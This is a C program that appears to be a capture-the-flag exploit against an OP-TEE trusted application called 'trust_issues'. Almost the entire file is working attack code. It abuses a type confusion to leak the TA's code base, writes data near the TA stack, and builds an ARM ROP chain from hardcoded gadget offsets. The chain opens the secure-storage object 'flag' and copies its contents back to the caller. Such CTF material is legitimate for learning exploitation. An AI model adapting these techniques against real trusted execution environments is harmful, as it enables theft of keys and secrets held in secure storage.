#include <ctype.h>
#include <err.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* OP-TEE TEE client API (built by optee_client) */
#include <tee_client_api.h>

/* For the UUID (found in the TA's h-file(s)) */
#include <trust_issues_ta.h>

typedef struct {
  TEEC_Context *ctx;
  TEEC_Session *sess;
} TrustletSession_t;

typedef enum TA_ARG {
  TA_ARG_CODE = 0,
  TA_ARG_INPUT = 1,
  TA_ARG_OUTPUT = 2,
} TA_ARG_t;

#define REGION_SIZE (0x3000 * 3)

typedef struct {
  char object_id[4];
  char flag_bytes[128];
  uint32_t object_handle;
  uint32_t read_bytes;
} RopData_t;

TrustletSession_t open_session() {
  TEEC_Result res;
  TEEC_Context *ctx = malloc(sizeof(TEEC_Context));
  TEEC_Session *sess = malloc(sizeof(TEEC_Session));
  TrustletSession_t session = {ctx, sess};
  uint32_t err_origin;

  res = TEEC_InitializeContext(NULL, ctx);
  if (res != TEEC_SUCCESS)
    errx(1, "TEEC_InitializeContext failed with code 0x%x", res);

  const TEEC_UUID uuid = TA_TRUST_ISSUES_UUID;
  res = TEEC_OpenSession(ctx, sess, &uuid, TEEC_LOGIN_PUBLIC, NULL, NULL,
                         &err_origin);
  if (res != TEEC_SUCCESS)
    errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x", res,
         err_origin);

  return session;
}

void finalize_session(TrustletSession_t *sess) {
  TEEC_CloseSession(sess->sess);
  TEEC_FinalizeContext(sess->ctx);

  free(sess->ctx);
  free(sess->sess);
}

void run_command(TrustletSession_t *sess, TEEC_Operation *op) {
  TEEC_Result res;
  uint32_t err_origin;
  res = TEEC_InvokeCommand(sess->sess, TA_TRUST_ISSUES_CMD_RUN_CODE, op,
                           &err_origin);
  // if (res != TEEC_SUCCESS)
  //   errx(1, "TEEC_InvokeCommand failed with code 0x%x origin 0x%x", res,
  //        err_origin);
}

// Helper function to set the tmpref argument for the TEEC_Operation.
void set_tmpref_arg(const TA_ARG_t arg_idx, TEEC_Operation *op, char *data,
                    uint32_t data_len) {
  op->params[arg_idx].tmpref.buffer = data;
  op->params[arg_idx].tmpref.size = data_len;
}

// Helper function to set the value argument for the TEEC_Operation.
void set_value_arg(const TA_ARG_t arg_idx, TEEC_Operation *op, uint32_t a,
                   uint32_t b) {
  op->params[arg_idx].value.a = a;
  op->params[arg_idx].value.b = b;
}

// Conversion functions.
uint32_t high_dword(const uint64_t val) { return (val >> 32) & 0xffffffffull; }
uint32_t low_dword(const uint64_t val) { return val & 0xffffffffull; }

uint64_t u64(const char *input) { return *(uint64_t *)input; }
uint32_t u32(const char *input) { return *(uint32_t *)input; }

void p64(uint64_t val, char *out_ptr) {
  memcpy(out_ptr, &val, sizeof(uint64_t));
}

void p32(uint64_t val, char *out_ptr) {
  memcpy(out_ptr, &val, sizeof(uint32_t));
}

#define P32(val, out_ptr)                                                      \
  {                                                                            \
    p32(val, out_ptr);                                                         \
    out_ptr += sizeof(uint32_t);                                               \
  }

void generate_readn(char *buf, const uint32_t n) {
  for (uint32_t i = 0; i < n; i++) {
    buf[i] = ',';
  }
}

void generate_writen(char *buf, const uint32_t n) {
  for (uint32_t i = 0; i < n; i++) {
    buf[i] = '.';
  }
}

void generate_mem_next(char *buf, const uint32_t n) {
  for (uint32_t i = 0; i < n; i++) {
    buf[i] = '>';
  }
}

void generate_mem_prev(char *buf, const uint32_t n) {
  for (uint32_t i = 0; i < n; i++) {
    buf[i] = '<';
  }
}

/**
 * buf: Buffer to write the ROP chain to.
 * input_param_location: Address of the input parameter (input buffer) in the
 * TA memory.
 * stack_base: Base address of the stack in the TA memory.
 */
void write_rop(char *buf, const uint32_t ta_code_base,
               const uint32_t input_param_location, const uint32_t stack_base) {
  // TEE_ObjectHandle object;

  // TEE_Result __cdecl OpenPersistentObjectWrapper(
  //       TEE_ObjectHandle *object = stack_base + 4 + 128,
  //       const unsigned __int8 *obj_id = "flag",
  //       size_t obj_id_sz = 4,
  //       uint32_t obj_data_flag = TEE_DATA_FLAG_ACCESS_READ |
  //       TEE_DATA_FLAG_SHARE_READ = 0x11)

  // res = TEE_ReadObjectData(object, data, object_info.dataSize, &read_bytes);

  // 0x00001f4c : pop {r0, r1, r2, r3} ; pop {ip, pc}
  const uint32_t pop_r0_r1_r2_r3_pop_ip_pc = ta_code_base + 0x00001f84;
  const uint32_t memcpy_unchecked =
      ta_code_base + 0x11AE4 | 1; // Skip `STRD.W R7, LR, [SP,#var_8]!`
  const uint32_t openpersistentobjectwrapper =
      ta_code_base + 0x61c | 1; // Skip `STRD.W R7, LR, [SP, #-8]!`
  const uint32_t tee_read_object_data =
      ta_code_base + 0x5A28 | 1; // Skip `STRD.W R7, LR, [SP,#var_8]!`

  char *rop_chain_start = buf;
  // Open the persistent object.
  P32(pop_r0_r1_r2_r3_pop_ip_pc, rop_chain_start);
  P32(stack_base + offsetof(RopData_t, object_handle), rop_chain_start); // r0
  P32(stack_base + offsetof(RopData_t, object_id), rop_chain_start);     // r1
  P32(sizeof(((RopData_t *)0)->object_id), rop_chain_start);             // r2
  P32(0x11, rop_chain_start);                                            // r3
  P32(0x45454545, rop_chain_start);                                      // ip
  P32(openpersistentobjectwrapper, rop_chain_start);                     // pc

  // Dereference the object handle. Basically use memcpy, to copy the value from
  // the stack_base + 0x26a8, to our current part of the rop-chain.
  P32(0x41414141, rop_chain_start);
  P32(pop_r0_r1_r2_r3_pop_ip_pc, rop_chain_start);
  P32(stack_base + 0x26a8, rop_chain_start);                             // r0
  P32(stack_base + offsetof(RopData_t, object_handle), rop_chain_start); // r1
  P32(sizeof(((RopData_t *)0)->object_handle), rop_chain_start);         // r2
  P32(0x41414141, rop_chain_start);                                      // r3
  P32(0x41414141, rop_chain_start);                                      // ip
  P32(memcpy_unchecked, rop_chain_start);                                // pc

  P32(0x41414141, rop_chain_start); // r7
  P32(pop_r0_r1_r2_r3_pop_ip_pc, rop_chain_start);
  P32(0x41424344, rop_chain_start); // r0 = object_handle (dummy value, replaced
                                    // in the rop-chain using memcpy call)
  P32(stack_base + offsetof(RopData_t, flag_bytes),
      rop_chain_start);      // r1 = data buffer
  P32(128, rop_chain_start); // r2 = data size
  P32(stack_base + offsetof(RopData_t, read_bytes),
      rop_chain_start);                       // r3 = actual bytes read
  P32(0x41414141, rop_chain_start);           // ip
  P32(tee_read_object_data, rop_chain_start); // pc

  // Copy the object data to the output buffer.
  P32(0x41414141, rop_chain_start);
  P32(pop_r0_r1_r2_r3_pop_ip_pc, rop_chain_start);
  P32(input_param_location + 0x01b8,
      rop_chain_start); // r0 = input_param_location
  P32(stack_base + offsetof(RopData_t, flag_bytes),
      rop_chain_start); // r1 = stack_base + offsetof(RopData_t, flag_bytes)
  P32(sizeof(((RopData_t *)0)->flag_bytes), rop_chain_start); // r2 = 128
  P32(0x41414141, rop_chain_start);                           // r3 = 0x41414141
  P32(0x41414141, rop_chain_start);                           // ip
  P32(memcpy_unchecked, rop_chain_start);                     // pc
}

int do_exploit(void) {
  TEEC_Operation op;
  TrustletSession_t sess = open_session();

  char *code = calloc(sizeof(char), REGION_SIZE);
  char *input = calloc(sizeof(char), REGION_SIZE);
  char *output = calloc(sizeof(char), REGION_SIZE);

  // ### 1: During the first invocation we expect to read the ELF header of the
  // TA.
  memset(&op, 0, sizeof(op));
  op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_VALUE_INOUT,
                                   TEEC_MEMREF_TEMP_INOUT, TEEC_NONE);

  const uint32_t guessed_code_base = 0x00117000; // Where RX section starts.

  generate_readn(code, 0x200);
  generate_mem_prev(code + 0x200, 0x200);
  generate_writen(code + 0x400, 0x200);

  set_tmpref_arg(TA_ARG_CODE, &op, code, strlen(code));
  // Exploit type-confusion here. We're pointing the input buffer to the
  // location of .GOT, and if we get lucky (=defeat aslr), the program will dump
  // the pointers we're interested in.
  set_value_arg(TA_ARG_INPUT, &op, guessed_code_base, 0x42424242);
  set_tmpref_arg(TA_ARG_OUTPUT, &op, output, REGION_SIZE);

  run_command(&sess, &op);

  // We expect to see bytes of the `TA_CreateEntryPoint` function in the output
  if (memcmp(output, "\x4D\xF8\x04\x7D\x00\xAF\x4F\xF0\x00\x03", 10) != 0)
    errx(1, "Failed to guess the base address of the TA code section!");

  // Stack is always at 0x0014a000
  const uint32_t stack_base = 0x0014a000;

  printf("TA Code Base: 0x%08x\n", guessed_code_base);
  printf("Stack Base: 0x%08x\n", stack_base);

  // ### 2: During the second invocation we can store everything we need near
  // the stack base.

  memset(code, 0, REGION_SIZE);
  memset(&op, 0, sizeof(op));

  RopData_t *rop_data = (RopData_t *)input;
  memcpy(rop_data->object_id, "flag",
         4); // Store object_id at the top of the stack.

  op.paramTypes =
      TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_MEMREF_TEMP_INOUT,
                       TEEC_VALUE_INOUT, TEEC_NONE);
  generate_readn(code, 0x500);            // Get 0x3000 bytes from "input".
  generate_mem_prev(code + 0x500, 0x500); // Move the memory pointer back.
  generate_writen(
      code + 0x500 + 0x500,
      0x500); // Write 0x3000 bytes to "output" (actually stack of the TA)

  set_tmpref_arg(TA_ARG_CODE, &op, code, strlen(code));
  set_tmpref_arg(TA_ARG_INPUT, &op, input, REGION_SIZE);
  set_value_arg(TA_ARG_OUTPUT, &op, stack_base, 0x41414141);

  run_command(&sess, &op);

  // ### 3: During the third invocation we're overwriting part of the stack with
  // rop-chain to write the data to our output buffer. If everything is done
  // correctly, we'll be able to read decrypted flag from this buffer.

  memset(code, 0, REGION_SIZE);
  memset(&op, 0, sizeof(op));

  const uint32_t input_param_location = 0x00200000;
  printf("Input param location: 0x%08x\n", input_param_location);
  write_rop(input, guessed_code_base, input_param_location, stack_base);

  op.paramTypes =
      TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT, TEEC_MEMREF_TEMP_INOUT,
                       TEEC_VALUE_INOUT, TEEC_NONE);
  generate_readn(code, 0x500);            // Get 0x3000 bytes from "input".
  generate_mem_prev(code + 0x500, 0x500); // Move the memory pointer back.
  generate_writen(
      code + 0x500 + 0x500,
      0x500); // Write 0x3000 bytes to "output" (actually stack of the TA)

  set_tmpref_arg(TA_ARG_CODE, &op, code, strlen(code));
  set_tmpref_arg(TA_ARG_INPUT, &op, input, REGION_SIZE);
  set_value_arg(TA_ARG_OUTPUT, &op, stack_base + 0x2664, 0x41414141);

  run_command(&sess, &op);

  // Finally, read the data from the input buffer.
  printf("Input buffer (should be flag???): %s\n", input);

  // Gracefully shutdown the session.
  finalize_session(&sess);

  free(code);
  free(input);
  free(output);

  return 0;
}

int store_flag(const char *flag) {
  TEEC_Result res;
  TEEC_Context ctx;
  TEEC_Session sess;
  TEEC_Operation op;
  TEEC_UUID uuid = TA_TRUST_ISSUES_UUID;
  uint32_t err_origin;

  res = TEEC_InitializeContext(NULL, &ctx);
  if (res != TEEC_SUCCESS)
    errx(1, "TEEC_InitializeContext failed with code 0x%x", res);

  res = TEEC_OpenSession(&ctx, &sess, &uuid, TEEC_LOGIN_PUBLIC, NULL, NULL,
                         &err_origin);
  if (res != TEEC_SUCCESS)
    errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x", res,
         err_origin);

  memset(&op, 0, sizeof(op));
  op.paramTypes = TEEC_PARAM_TYPES(
      TEEC_MEMREF_TEMP_INPUT, TEEC_MEMREF_TEMP_INPUT, TEEC_NONE, TEEC_NONE);

  char storage_id[] = "flag";

  op.params[0].tmpref.buffer = storage_id;
  op.params[0].tmpref.size = sizeof(storage_id) - 1;

  char flag_data[1024] = {0};
  size_t data_len = strlen(flag) + 1;
  if (data_len > sizeof(flag_data))
    errx(1, "Flag is too long");

  memcpy(flag_data, flag, data_len);

  op.params[1].tmpref.buffer = flag_data;
  op.params[1].tmpref.size = data_len;

  res = TEEC_InvokeCommand(&sess, TA_TRUST_ISSUES_CMD_WRITE_SECURE_OBJECT, &op,
                           &err_origin);
  if (res != TEEC_SUCCESS)
    errx(1, "TEEC_InvokeCommand failed with code 0x%x origin 0x%x", res,
         err_origin);

  TEEC_CloseSession(&sess);
  TEEC_FinalizeContext(&ctx);

  return 0;
}

int read_flag() {
  TEEC_Result res;
  TEEC_Context ctx;
  TEEC_Session sess;
  TEEC_Operation op;
  TEEC_UUID uuid = TA_TRUST_ISSUES_UUID;
  uint32_t err_origin;

  res = TEEC_InitializeContext(NULL, &ctx);
  if (res != TEEC_SUCCESS)
    errx(1, "TEEC_InitializeContext failed with code 0x%x", res);

  res = TEEC_OpenSession(&ctx, &sess, &uuid, TEEC_LOGIN_PUBLIC, NULL, NULL,
                         &err_origin);
  if (res != TEEC_SUCCESS)
    errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x", res,
         err_origin);

  memset(&op, 0, sizeof(op));
  op.paramTypes = TEEC_PARAM_TYPES(
      TEEC_MEMREF_TEMP_INPUT, TEEC_MEMREF_TEMP_OUTPUT, TEEC_NONE, TEEC_NONE);

  char storage_id[] = "flag";

  op.params[0].tmpref.buffer = storage_id;
  op.params[0].tmpref.size = sizeof(storage_id) - 1;

  char flag_data[1024] = {0};

  op.params[1].tmpref.buffer = flag_data;
  op.params[1].tmpref.size = 1024;

  res = TEEC_InvokeCommand(&sess, TA_TRUST_ISSUES_CMD_READ_SECURE_OBJECT, &op,
                           &err_origin);
  if (res != TEEC_SUCCESS)
    errx(1, "TEEC_InvokeCommand failed with code 0x%x origin 0x%x", res,
         err_origin);

  printf("Flag: %s\n", (char *)op.params[1].tmpref.buffer);
  printf("Flag size: %zu\n", op.params[1].tmpref.size);

  TEEC_CloseSession(&sess);
  TEEC_FinalizeContext(&ctx);

  return 0;
}

int main(int argc, char *argv[]) {
  if (argc < 2) {
    fprintf(stderr, "Usage: %s <command> [args]\n", argv[0]);
    fprintf(stderr, "Commands:\n");
    fprintf(stderr, "  exploit\n");
    fprintf(stderr, "  store_flag <flag>\n");
    fprintf(stderr, "  read_flag (non-production only)\n");
    return 1;
  }

  if (strcmp(argv[1], "exploit") == 0) {
    do_exploit();
  } else if (strcmp(argv[1], "store_flag") == 0) {
    if (argc < 3) {
      fprintf(stderr, "Usage: %s store_flag <flag>\n", argv[0]);
      return 1;
    }
    store_flag(argv[2]);
  } else if (strcmp(argv[1], "read_flag") == 0) {
    read_flag();
  } else {
    fprintf(stderr, "Unknown command: %s\n", argv[1]);
    return 1;
  }

  return 0;
}